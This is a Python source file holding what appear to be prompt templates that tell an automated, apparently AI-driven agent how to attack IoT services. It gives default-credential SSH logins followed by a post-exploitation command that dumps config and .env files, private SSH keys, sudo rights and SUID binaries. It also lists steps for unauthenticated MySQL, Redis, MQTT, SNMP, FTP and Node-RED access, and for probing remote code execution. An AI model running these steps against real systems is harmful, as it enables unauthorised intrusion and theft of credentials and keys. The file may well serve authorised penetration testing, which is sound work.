"""Service-specific verification instructions."""


EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
    "credentials": {
        "ssh": (
            "Test default credentials on this service.\n"
            "For SSH (port 22) — try these pairs in order, stop at FIRST successful login:\n"
            "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
            "  2. ssh_login(\"sshpass -p root ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc root@{ip} 'id'\")\n"
            "  3. ssh_login(\"sshpass -p ubnt ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc ubnt@{ip} 'id'\")\n"
            "  4. ssh_login(\"sshpass -p raspberry ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc pi@{ip} 'id'\")\n\n"
            "If ANY login succeeds (return_code=0), run a SINGLE post-exploitation command:\n"
            "  ssh_login(\"sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@{ip} 'echo === IDENTITY === && id && echo === CREDENTIALS === && (cat /etc/iot/config.json 2>/dev/null || echo no-config) && (cat /home/*/.env 2>/dev/null || echo no-env) && echo === SSH_KEYS === && (ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || echo no-ssh-keys) && echo === NETWORK === && (ip addr show 2>/dev/null || ifconfig 2>/dev/null) && echo === PRIVESC === && (sudo -l 2>/dev/null || echo no-sudo) && (find / -perm -4000 -type f 2>/dev/null | head -5 || echo no-suid)'\")\n"
        ),
        "mysql": (
            "Test default credentials on this service.\n"
            "For MySQL/MariaDB (port 3306) — try root with empty password and skip only certificate validation:\n"
            "  mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\", skip_ssl=true)\n"
            "Report ALL data retrieved in data_extracted field.\n"
        ),
        "mqtt": (
            "Test default credentials on this service.\n"
            "For MQTT (port 1883) — test weak credentials (use Phase 3 evidence for hints):\n"
            "  mqtt_listen(broker=\"{ip}\", topic=\"#\", count=5, timeout=5, username=\"test\", password=\"test\")\n"
            "  If that fails (return_code=5), try: username=\"admin\", password=\"admin\"\n"
            "  If that fails, try: username=\"mqtt\", password=\"mqtt\"\n"
        ),
        "snmp": (
            "Test default credentials on this service.\n"
            "For SNMP (port 161) — run the required read-only public-community probe:\n"
            "  udp_send(host=\"{ip}\", port=161, payload=\"302402010004067075626c6963a017020101020100300c300a06082b060102010101010500\", encoding=\"hex\", timeout=5)\n"
        ),
        "redis": (
            "Test default credentials on this service.\n"
            "For Redis (port 6379) — Redis rarely has credentials by default:\n"
            "  redis_cmd(host=\"{ip}\", command=\"KEYS *\")\n"
            "  If that works, extract sensitive keys: redis_cmd(host=\"{ip}\", command=\"GET config:db_password\")\n"
        ),
        "default": "Test default credentials on this service. Use appropriate tools based on the Phase 3 evidence.\n"
    },
    "data_access": {
        "mqtt": "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) — capture messages, extract credentials/keys\n",
        "http": "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\nFor HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) for each listed file\nIf the URL from evidence returns 404, mark the Phase 4 attempt as FAILED and preserve the 404 as evidence.",
        "telnet": "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n",
        "mysql": "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\", skip_ssl=true) — show data\n",
        "ftp": "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n",
        "redis": "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n",
        "nodered": "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n",
        "coap": "For CoAP (port 5683): use the required bounded udp_send GET probe with encoding=hex and timeout=5; a response proves unauthenticated UDP access.\n",
        "default": "Access the service and retrieve actual data to prove impact. Use the tool that matches the service in evidence. If the tested URL returns 404, mark the Phase 4 attempt as FAILED and preserve the 404 as evidence."
    },
    "injection": {
        "http": (
            "Attempt code execution or unauthorized upload/firmware access.\n"
            "For file upload (web_upload role, port 80): http_get(\"http://{ip}/uploads/\") to check for uploaded files, then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
            "For firmware update without signature (iot_gateway, port 80): if curl_headers on /firmware/ shows an Index of with firmware files and no .sig/.asc/.sha256/.sha512 sidecar, report insecure_update HIGH; if /update accepts an update request, confirm it with the required http_request POST with a non-empty probe body.\n"
            "For web API RCE (web_server_v2, port 80): http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n"
            "Report what is accessible and whether code execution is possible."
        ),
        "nodered": (
            "Attempt code execution or unauthorized upload/firmware access.\n"
            "For Node-RED RCE (nodered_server, port 1880): http_get(\"http://{ip}:1880/flows\") to access flow definitions\n"
            "Report what is accessible and whether code execution is possible."
        ),
        "default": "Attempt code execution or unauthorized upload/firmware access. Report what is accessible and whether code execution is possible."
    }
}
